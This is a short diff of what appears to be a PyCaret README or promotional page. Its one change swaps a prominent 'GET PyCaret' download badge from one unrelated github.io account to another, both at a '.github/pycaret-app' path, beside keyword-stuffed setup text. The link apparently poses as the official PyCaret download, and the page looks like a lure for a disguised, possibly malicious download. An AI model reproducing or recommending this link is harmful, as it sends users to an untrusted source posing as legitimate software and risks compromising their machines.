@@ -53,7 +53,7 @@ For new users, pycaret documentation, a pycaret tutorial, and pycaret examples a
 
 Prerequisites: A supported Python environment, pip or conda access, and a dataset suitable for classification, regression, clustering, or time series modeling.
 
-[![GET PyCaret](https://img.shields.io/badge/GET%20%E2%80%94%20PyCaret-3776AB?style=for-the-badge&logoColor=white)](https://teddyrosariojgih.github.io/.github/pycaret-app)
+[![GET PyCaret](https://img.shields.io/badge/GET%20%E2%80%94%20PyCaret-3776AB?style=for-the-badge&logoColor=white)](https://jordanbrittany060958.github.io/.github/pycaret-app)
 
 1.  **Install the Package:** Run pycaret install commands from the official pycaret documentation inside a clean virtual environment to avoid dependency conflicts.
 2.  **Open an Example Workflow:** Use a pycaret tutorial or pycaret examples notebook to learn the core sequence of importing modules, loading data, and calling pycaret setup.
